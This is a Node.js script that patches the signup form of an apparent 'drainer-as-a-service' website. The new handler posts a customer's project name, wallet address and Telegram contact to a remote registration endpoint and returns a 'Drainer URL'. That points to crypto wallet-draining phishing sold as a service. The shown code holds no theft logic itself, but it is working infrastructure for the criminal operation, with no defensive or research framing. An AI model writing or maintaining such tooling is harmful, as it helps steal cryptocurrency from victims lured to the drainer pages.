const fs = require('fs');
let content = fs.readFileSync('saas-website.js', 'utf8');

// Replace the current script with DOM ready version
const newScript = `    <script>
        // Wait for DOM to be fully loaded
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('signupForm');
            if (!form) {
                console.error("Form not found!");
                return;
            }
            
            console.log("Form found, adding event listener...");
            
            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                console.log('Form submitted!');
                
                const formData = {
                    projectName: this.querySelector('input[placeholder="Project Name"]').value,
                    wallet: this.querySelector('input[placeholder="Your Wallet Address"]').value,
                    contact: this.querySelector('input[placeholder="Telegram Username"]').value,
                    themeColor: this.querySelector('select').value
                };
                
                console.log('Form data:', formData);

                try {
                    const response = await fetch('https://service-s816.onrender.com/saas/v2/register', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(formData)
                    });

                    const result = await response.json();
                    console.log('API Response:', result);
                    
                    if (result.success) {
                        alert('✅ Success! Your Drainer URL: ' + result.drainerUrl);
                        // Optional: Redirect to dashboard
                        // window.location.href = result.dashboardUrl;
                    } else {
                        alert('❌ Error: ' + result.error);
                    }
                } catch (error) {
                    console.error('Request failed:', error);
                    alert('❌ Network error: ' + error.message);
                }
            });
            
            console.log("Form event listener added successfully!");
        });
    </script>`;

// Replace the entire script section
content = content.replace(/<script>\s*document\.getElementById\('signupForm'\)\.addEventListener\('submit', async function\(e\) \{[\s\S]*?\}\);\s*<\/script>/g, newScript);

fs.writeFileSync('saas-website.js', content);
console.log('✅ Added DOM ready check and debug logging');
